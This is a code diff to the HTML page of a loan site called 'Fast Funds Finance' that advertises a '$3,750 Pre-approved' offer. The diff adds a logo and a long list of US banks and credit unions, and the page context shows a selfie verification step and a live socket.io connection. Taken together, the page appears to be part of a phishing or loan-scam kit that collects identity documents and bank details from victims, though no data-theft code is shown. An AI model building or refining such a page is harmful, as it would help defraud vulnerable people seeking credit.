@@ -15,15 +15,16 @@
 <body class="bg-white text-zinc-900 min-h-screen">
 
     <!-- NAVBAR -->
-    <nav class="bg-white border-b shadow-sm sticky top-0 z-50">
-        <div class="max-w-6xl mx-auto px-6 py-5 flex justify-between items-center">
-            <div class="flex items-center gap-3">
-                <span class="text-4xl">💰</span>
-                <h1 class="text-3xl font-bold text-amber-600">Finance Approved Now</h1>
-            </div>
-            <div id="approved-amount" class="text-amber-600 font-semibold text-xl">$3,750 Pre-approved</div>
+<nav class="bg-white border-b shadow-sm sticky top-0 z-50">
+    <div class="max-w-6xl mx-auto px-6 py-4 flex justify-between items-center">
+        <!-- LOGO ULTRA ALARGADO Y GRANDE -->
+        <img src="logo.png" alt="Fast Funds Finance" class="h-16 w-auto">
+        
+        <div id="approved-amount" class="text-amber-600 font-semibold text-xl">
+            $3,750 Pre-approved
         </div>
-    </nav>
+    </div>
+</nav>
 
     <div class="max-w-2xl mx-auto px-6 py-10">
 
@@ -213,7 +214,67 @@
         { id: 3, title: "Take a clear selfie", example: "selfie-example.png" }
     ];
 
-    const banks = ["Chase Bank", /* ... resto de tu lista de bancos sin cambios ... */];
+    // ==================== BANK LIST (muy larga) ====================
+        const banks = [
+    "Chase Bank", "Bank of America", "Wells Fargo", "Citibank", "Capital One",
+    "PNC Bank", "TD Bank", "U.S. Bank", "HSBC", "American Express",
+    "Discover Bank", "Ally Bank", "Regions Bank", "Fifth Third Bank",
+    "KeyBank", "Truist Bank", "Citizens Bank", "Comerica Bank",
+    "Huntington Bank", "First Horizon Bank", "Synovus Bank",
+    "Associated Bank", "Old National Bank", "Valley National Bank",
+    "Webster Bank", "Zions Bank", "Bank of the West", "First Republic Bank",
+    "Signature Bank", "Silicon Valley Bank", "Goldman Sachs Bank",
+    "Morgan Stanley Bank", "Charles Schwab Bank", "BMO Harris Bank",
+    "Santander Bank", "Deutsche Bank", "Barclays Bank", "BNY Mellon",
+    "State Street Bank", "Northern Trust", "First Citizens Bank",
+    "Wintrust Bank", "CIBC Bank USA", "RBC Bank", "BMO Bank",
+    "Flagstar Bank", "New York Community Bank", "Popular Bank",
+    "East West Bank", "Cathay Bank", "BankUnited", "PacWest Bank",
+    "Western Alliance Bank", "Arvest Bank", "Simmons Bank",
+    "First National Bank", "Frost Bank", "Cullen/Frost Bank",
+    "Texas Capital Bank", "Prosperity Bank", "Cadence Bank",
+    "SouthState Bank", "Ameris Bank", "Atlantic Union Bank",
+    "United Bank", "Sandy Spring Bank", "EagleBank", "FirstBank",
+    "Banner Bank", "Columbia Bank", "Umpqua Bank", "Washington Federal",
+    "Glacier Bank", "Heartland Bank", "First Midwest Bank",
+    "Old Second Bank", "Byline Bank", "Cross River Bank",
+    "LendingClub Bank", "Varo Bank", "Current Bank", "SoFi Bank",
+    "JPMorgan Chase", "Bank of America Private Bank", "M&T Bank",
+    "People's United Bank", "FirstBank Puerto Rico", "Oriental Bank",
+    "Banco Popular North America", "Banc of California", "Axos Bank",
+    "Tastytrade Bank", "Mercury Bank", "Brex Bank", "Bluevine Bank",
+    "Lendio Bank", "Live Oak Bank", "Lendistry Bank", "Tremont Bank",
+    "Lima Bank", "Stride Bank", "Sallie Mae Bank", "Synchrony Bank",
+    "Target Bank", "Amazon Bank", "Apple Card (Goldman Sachs)",
+    "Chime", "Varo", "Current", "Aspiration", "Radius Bank",
+    "Betterment Banking", "Wealthfront Cash", "Fidelity Bank",
+    "Vanguard Bank", "Schwab Bank", "E*TRADE Bank", "Robinhood Bank",
+    "Public Bank", "Tastyworks Bank", "Interactive Brokers Bank",
+    "First Internet Bank", "TCM Bank", "Lakeland Bank",
+    "Peapack-Gladstone Bank", "Provident Bank", "OceanFirst Bank",
+    "Kearny Bank", "Northfield Bank", "ConnectOne Bank",
+    "Bogota Savings Bank", "Mariner's Bank", "NVE Bank",
+    "1st Constitution Bank", "Union Bank", "Central Bank",
+    "Farmers Bank", "Community Bank", "Heritage Bank",
+    "Pacific Western Bank", "First Hawaiian Bank", "Bank of Hawaii",
+    "Central Pacific Bank", "American Savings Bank", "Territorial Savings Bank",
+    "Hawaii National Bank", "Ohana Bank", "Bank of Hope",
+    "Nations Bank", "Premier Bank", "Summit Bank",
+    "Great Western Bank", "First Interstate Bank", "Columbia State Bank",
+    "Heritage Bank of Commerce", "Bank of Marin", "Tri Counties Bank",
+    "Sierra Central Credit Union", "Golden 1 Credit Union",
+    "SchoolsFirst Federal Credit Union", "Navy Federal Credit Union",
+    "PenFed Credit Union", "Alliant Credit Union", "Connexus Credit Union",
+    "Lake Michigan Credit Union", "Digital Federal Credit Union",
+    "Boeing Employees Credit Union", "State Employees' Credit Union",
+    "Teachers Federal Credit Union", "Suncoast Credit Union",
+    "America First Credit Union", "Mountain America Credit Union",
+    "Delta Community Credit Union", "BECU", "Veridian Credit Union",
+    "Wings Financial Credit Union", "Ent Credit Union",
+    "Security Service Federal Credit Union", "Randolph-Brooks Federal Credit Union",
+    "San Diego County Credit Union", "OnPoint Community Credit Union",
+    "Golden 1", "SchoolsFirst", "Navy Federal", "PenFed", "Alliant"
+];
 
     const socket = io();
 
